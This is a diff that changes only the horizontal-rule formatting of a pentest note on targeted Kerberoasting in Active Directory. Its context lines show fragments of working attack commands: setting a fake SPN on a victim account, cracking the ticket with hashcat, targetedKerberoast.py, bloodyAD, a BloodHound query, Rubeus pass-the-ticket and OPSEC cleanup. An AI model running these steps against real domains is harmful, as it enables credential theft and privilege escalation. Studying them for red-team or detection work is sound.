@@ -17,7 +17,7 @@ linked:
 ---
 # Kerberoasting - Targeted Kerberoasting
 
-***
+---
 
 ## Concept Overview
 
@@ -30,7 +30,7 @@ linked:
 | Detection | Event 5136 (LDAP modify) + 4769 (TGS request) |
 ^kerb-targeted-concept
 
-___
+---
 
 ## ACL Required
 
@@ -54,7 +54,7 @@ Find-InterestingDomainAcl -ResolveGUIDs |
   Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
 ```
 
-___
+---
 
 ## Attack Workflow
 
@@ -89,7 +89,7 @@ Set-ADUser $Victim -ServicePrincipalNames @{Remove=$FakeSPN}
 hashcat -m 13100 hash.txt rockyou.txt -O
 ```
 
-___
+---
 
 ## targetedKerberoast.py (Linux Auto)
 
@@ -115,7 +115,7 @@ python3 targetedKerberoast.py -d corp.local -u atacante -p 'Pass!' --dc-ip <DC>
 # [+] Cleaning up SPN
 ```
 
-___
+---
 
 ## bloodyAD Targeted (Linux)
 
@@ -137,7 +137,7 @@ bloodyAD --host <DC> -d corp -u atacante -p 'Pass!' \
   remove object jsmith servicePrincipalName -v 'HTTP/fakesvc.corp.local'
 ```
 
-___
+---
 
 ## BloodHound Targeted Kerberoast Edges
 
@@ -148,7 +148,7 @@ ___
 | `MATCH (u {owned:true})-[*1..3]->(t:User {adminCount:true}) WHERE NOT t.hasspn RETURN p` | Path a priv users sin SPN (max value) | Critical. |
 ^kerb-targeted-bh
 
-___
+---
 
 ## Post-Crack Privesc
 
@@ -160,7 +160,7 @@ ___
 | `Rubeus.exe asktgt /user:<victim> /password:<cracked> /domain:corp.local /ptt` | TGT con cracked pwd | Standard auth. |
 ^kerb-targeted-postcrack
 
-___
+---
 
 ## OPSEC
 
@@ -187,7 +187,7 @@ sleep 30
 bloodyAD ... remove object $VICTIM servicePrincipalName -v "$RANDOM_SPN"
 ```
 
-___
+---
 
 ## Common Errors
 
@@ -200,4 +200,4 @@ ___
 | Hash cracked pero auth fail | Password rotated post-crack | Re-roast post-rotation. |
 ^kerb-targeted-errors
 
-***
+---
